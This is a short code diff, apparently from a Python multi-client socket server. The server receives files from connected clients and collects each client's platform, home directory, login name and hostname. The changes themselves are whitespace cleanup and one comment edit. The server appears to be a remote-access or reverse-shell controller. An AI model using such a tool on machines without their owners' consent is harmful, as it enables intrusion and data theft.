@@ -122,7 +122,7 @@ class MultiServer(object):
             sys.exit(1)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         return
-    
+
     def socket_bind(self):
         """ Bind socket to port and wait for connection from client """
         try:
@@ -282,7 +282,7 @@ class MultiServer(object):
 
     def receive_file(self, conn):
         """ Transfer file from Client to Server """
-        
+
         file_to_transfer = input('File to Transfer to Server: ')
         save_as = input('Save as: ')
 
@@ -313,7 +313,7 @@ class MultiServer(object):
         info = json.loads(self.receive(conn, _print=False).decode())
         system = info[0] # platform.system()
         home = info[1] # os.path.expanduser('~')
-        login = info[2] # os.getlogin()
+        login = info[2] # getpass.getlogin()
         hostname = self.all_addresses[self.all_connections.index(conn)][-1]
 
         while 1:
